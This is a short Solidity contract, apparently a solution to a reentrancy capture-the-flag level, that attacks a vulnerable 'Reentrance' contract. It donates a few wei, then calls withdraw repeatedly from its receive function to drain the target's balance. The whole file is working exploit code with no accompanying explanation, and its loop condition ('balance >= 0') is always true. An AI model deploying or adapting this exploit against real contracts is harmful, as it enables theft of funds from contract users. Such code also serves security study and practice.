// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IReentrance {
    function withdraw(uint _amount) external;  
    function donate(address _to) external payable;
}

contract AttackReentrance {

    IReentrance reentranceContract;
    constructor(address payable _reentranceContract) {
        reentranceContract = IReentrance(_reentranceContract);
    }
    function attack() public payable {
        reentranceContract.donate{value: 3 wei}(address(this));
        reentranceContract.withdraw(1 wei);
    }
    receive() external payable  {
        if(address(reentranceContract).balance >= 0) {
            reentranceContract.withdraw(1 wei);
        }
    }

     function getBalance() external view returns(uint) {
        return address(this).balance;
    }
}

// 0xa2D75a560eD62eB063615850F0aca0c09c56f3ed